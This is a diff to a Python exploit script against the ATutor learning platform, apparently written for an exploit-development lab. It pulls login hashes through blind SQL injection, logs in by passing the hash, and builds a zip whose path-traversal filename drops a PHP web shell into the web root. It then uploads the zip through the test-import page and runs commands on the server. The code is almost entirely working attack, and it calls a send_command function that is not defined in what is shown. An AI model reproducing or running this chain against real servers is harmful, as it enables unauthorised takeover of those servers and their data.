@@ -3,6 +3,8 @@ import re
 import requests
 import hashlib
 from bs4 import BeautifulSoup
+import zipfile
+from io import BytesIO
 
 ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
 # List of characters in (rough) order of frequency
@@ -42,9 +44,13 @@ def extract_data(ip, inj):
     return output
 
 def login(ip, username, user_hash):
-    target = f"http://{ip}//ATutor/login.php"
+    target = f"http://{ip}/ATutor/login.php"
     token = "token"
     hashed = hashlib.sha1((user_hash + token).encode('utf-8'))
+
+    proxies = {
+        'http': 'http://127.0.0.1:8080'
+    }
 
     data = {
         "submit": "Login",
@@ -52,13 +58,57 @@ def login(ip, username, user_hash):
         "form_password_hidden": hashed.hexdigest(),
         "token":token
     }
+
     s = requests.Session()
-    r = s.post(target, data=data)
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+    }
+
+    s.headers.update(headers)
+
+    proxies = {
+        'http': 'http://127.0.0.1:8080'
+    }
+    s.proxies.update(proxies)
+
+    r = s.post(target, data=data,proxies=proxies)
     res = r.text
 
     if re.search("Invalid login/password combination.",res):
-        return False
-    return True
+        raise Exception("Invalid Login!")
+    return s
+
+def build_zip():
+    f = BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+
+    z.writestr('../../../../var/www/html/ATutor/mods/poc.php5', data='<?php system($_GET["cmd"]);?>')
+    z.writestr('imsmanifest.xml', data='invalid file!')
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+def upload_zip(ip, session):
+    build_zip()
+
+    target = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"
+
+    data = {
+        'submit_import': 'Import'
+    }
+
+    with open('poc.zip', 'rb') as file:
+        files = {
+            "file": file
+        }
+
+        r = session.post(target,files=files, data=data)
+        res = r.text
+
+    # print(res)
 
 def main():
     if len(sys.argv) != 2:
@@ -68,26 +118,35 @@ def main():
 
     ip = sys.argv[1]
 
-    member_username_injection_string = "select/**/login/**/FROM/**/AT_members"
-    # member_username = extract_data(ip, member_username_injection_string)
-    member_username = "teacher"
+    username_injection_string = "select/**/login/**/FROM/**/AT_members"
+    # username = extract_data(ip, username_injection_string)
+    username = "teacher"
 
-    memeber_password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{member_username}\""
-    # member_hash = extract_data(ip, memeber_password_injection_string)
-    member_hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
-    print(f"Extracted Credentials: {member_username}, {member_hash}")
+    memeber_password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
+    # hash = extract_data(ip, memeber_password_injection_string)
+    hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
+    print(f"Extracted Credentials: {username}, {hash}")
 
-    admin_username_injection_string = "select/**/login/**/FROM/**/AT_admins"
-    # admin_username = extract_data(ip, admin_username_injection_string)
-    admin_username = "admin"
+    session = login(ip, username, hash)
 
-    admin_password_injection_string = f"select/**/password/**/FROM/**/AT_admins/**/WHERE/**/login=\"{admin_username}\""
-    # admin_hash = extract_data(ip, admin_password_injection_string)
-    admin_hash = "f865b53623b121fd34ee5426c792e5c33af8c227"
-    print(f"Extracted Credentials: {admin_username}, {admin_hash}")
+    # Main page
+    r = session.get(f"http://{ip}/ATutor/users/index.php")
+    text = r.text
 
-    print(login(ip, member_username, member_hash))
-    print(login(ip, admin_username, admin_hash))
+    # Get the bounce.php link in the main page response
+    link = re.findall('href="(bounce.php?.*)"', text)
+    if len(link) == 0:
+        raise "No valid course!"
+
+    # Visit the bounce.php link to choose the course
+    r = session.get(f"http://{ip}/ATutor/{link[0]}")
+
+    # Upload zip file with malicious PHP
+    upload_zip(ip, session)
+
+    # Send command to our uploaded reverse shell
+    resp = send_command(ip, session, 'whoami')
+    print(resp)
 
 if __name__ == "__main__":
     main()
